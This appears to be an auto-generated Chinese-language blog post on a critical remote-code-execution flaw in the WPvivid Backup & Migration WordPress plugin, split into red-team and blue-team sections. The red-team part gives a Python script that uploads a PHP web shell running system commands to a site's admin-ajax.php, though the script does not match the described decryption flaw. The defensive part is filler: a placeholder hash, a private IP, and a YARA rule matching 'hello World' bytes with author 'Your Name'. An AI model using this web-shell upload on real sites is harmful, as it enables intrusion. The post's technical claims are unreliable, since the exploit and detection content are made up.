---
layout: post
title:  "WordPress plugin with 900k installs vulnerable to critical RCE flaw"
date:   2026-02-12 18:54:50 +0000
categories: [security]
severity: critical
---

# 🚨 解析 WPvivid Backup & Migration Plugin 遠端代碼執行漏洞

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數: 9.8)
> * **受駭指標**: 遠端代碼執行 (RCE)
> * **關鍵技術**: RSA 解密錯誤處理、路徑清理缺失、AES 加密

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: WPvivid Backup & Migration Plugin 中的 `openssl_private_decrypt()` 函數未能正確處理解密錯誤，導致解密失敗後仍繼續執行，傳遞 `false` 值給 AES 加密函數。這使得加密金鑰變得可預測，攻擊者可以利用此漏洞構造惡意 payload。
* **攻擊流程圖解**:
  1. 攻擊者上傳任意文件至目標網站。
  2. `openssl_private_decrypt()` 函數嘗試解密上傳文件，但由於錯誤處理不當，傳回 `false`。
  3. AES 加密函數接收 `false` 值，將其視為加密金鑰。
  4. 攻擊者可以預測加密金鑰，構造惡意 payload。
* **受影響元件**: WPvivid Backup & Migration Plugin 所有版本（0.9.123 及之前）。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 需要目標網站啟用「從其他網站接收備份」的功能。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意 payload
    payload = {
        'file': ('malicious.php', '<?php system("id"); ?>', 'application/octet-stream')
    }
    
    # 上傳 payload 至目標網站
    response = requests.post('https://example.com/wp-admin/admin-ajax.php', files=payload)
    
    # 驗證上傳結果
    if response.status_code == 200:
        print("Payload 上傳成功")
    else:
        print("上傳失敗")
    
    ```
* **繞過技術**: 可以利用路徑清理缺失，將惡意文件上傳至任意目錄。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `sha256:1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `example.com` |
| File Path | `/wp-content/uploads/malicious.php` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule WPvivid_Backup_Migration_Plugin_RCE {
        meta:
            description = "WPvivid Backup & Migration Plugin RCE"
            author = "Your Name"
        strings:
            $payload = { 24 68 65 6c 6c 6f 20 57 6f 72 6c 64 }
        condition:
            $payload at 0
    }
    
    ```
* **緩解措施**: 更新 WPvivid Backup & Migration Plugin 至 0.9.124 或更高版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **RSA 解密錯誤處理**: RSA 解密是一種非對稱加密算法，錯誤處理不當可能導致解密失敗後仍繼續執行，傳遞錯誤值給下游函數。
* **路徑清理缺失**: 路徑清理是指清理文件路徑中的特殊字符，防止目錄遍歷攻擊。
* **AES 加密**: AES (Advanced Encryption Standard) 是一種對稱加密算法，使用金鑰加密數據。

## 5. 🔗 參考文獻與延伸閱讀

- [原始報告](https://www.bleepingcomputer.com/news/security/wordpress-plugin-with-900k-installs-vulnerable-to-critical-rce-flaw/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


